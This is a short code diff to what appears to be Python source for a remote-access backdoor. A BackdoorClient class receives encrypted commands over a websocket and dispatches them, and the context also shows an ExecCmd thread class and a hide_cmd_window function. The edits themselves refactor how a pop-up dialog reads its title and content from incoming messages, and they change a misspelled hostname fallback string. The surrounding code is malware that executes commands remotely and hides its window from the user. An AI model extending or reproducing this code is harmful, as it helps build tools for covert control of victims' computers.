@@ -40,6 +40,7 @@ class BackdoorClient(threading.Thread):
                     msg = json.loads(self.decrypt(self.ws.recv()))
                     if 'cmd' in msg:
                         command = msg['cmd']
+
                         if command == 'dialog':
                             ShowDialog(msg)
 
@@ -84,11 +85,13 @@ class ExecCmd(threading.Thread):
 
 
 class ShowDialog(threading.Thread):
-    def __init__(self, content, msg):
+    def __init__(self, msg):
         threading.Thread.__init__(self)
-        self.content = content
+        self.content = msg['content']
         self.msg = msg
-        self.title = msg['data']
+        self.title = msg['title']
+        if not self.title:
+            self.title = u''
 
         self.daemon = True
         self.start()
@@ -110,7 +113,7 @@ def hostname():
         finally:
             host.close()
     else:
-        return 'Unkwon hostname'
+        return 'Unknow hostname'
 
 
 def hide_cmd_window():
